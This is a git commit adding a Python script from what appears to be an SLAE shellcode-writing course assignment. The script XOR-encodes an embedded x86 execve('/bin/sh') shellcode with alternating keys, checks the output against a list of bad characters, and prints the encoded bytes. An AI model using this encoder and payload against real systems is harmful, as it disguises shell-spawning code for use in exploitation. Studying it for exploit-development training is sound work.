b3d8c87fa621399a64bac942410d8b7a3e80df5c
jayeshchm <59499796+jayeshchm@users.noreply.github.com>
2020-06-30 19:22:04 +0530

    Create xor-encode1.py

---
+++ SLAE assignment 2/xor-encode1.py
@@ -0,0 +1,45 @@
+#!/usr/bin/python
+
+import sys
+
+def encodeByte(i , cnt):
+
+	j = 0	
+	bad_char = [0, 10, 13, 14]
+	
+	if cnt % 2 == 1:		
+		j =  i^(0xAA + 0x6)
+	else:
+		j =  i^(0xBB + 0x6)
+
+	if j in bad_char:
+		print 'bad character generated...' + '\n'
+		exit(1)
+	return j
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+encoded = ""
+encoded2 = ""
+rev_encoded = []
+
+cnt = 1
+
+for i in bytearray(shellcode):
+	j = encodeByte(i , cnt)
+	
+
+	encoded += "\\x"
+	encoded += "%02x" %j
+		
+
+	encoded2 += "0x"
+	encoded2 += "%02x," %j
+	
+	cnt = cnt + 1
+
+print encoded + '\n'
+print encoded2 + '\n'
+
+print 'Shellcode length:%d' %len(shellcode)
+
